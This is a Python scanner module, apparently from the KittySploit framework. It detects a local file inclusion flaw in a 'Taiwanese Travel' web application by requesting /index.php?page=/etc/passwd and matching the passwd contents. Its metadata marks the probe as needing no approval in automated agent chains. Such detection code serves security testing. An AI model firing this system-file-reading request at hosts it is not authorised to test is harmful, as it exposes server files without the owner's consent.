#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The vulnerability in '/index."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Taiwanese Travel - Local File Inclusion Detection',
        'description': "The vulnerability in '/index.php?page=' allows for Local File Inclusion (LFI), granting attackers the ability to include and potentially execute files on the server, compromising the application's security",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'lfi', 'unauth', 'taiwanese', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://www.exploitalert.com/view-details.html?id=35607'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?page=/etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('travel',)
        body_regexes = ('root:x:0:0:',)
        if (any(m in body for m in body_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Taiwanese Travel - Local File Inclusion detected",
                path='/index.php?page=/etc/passwd',
            )
            return True
        return False

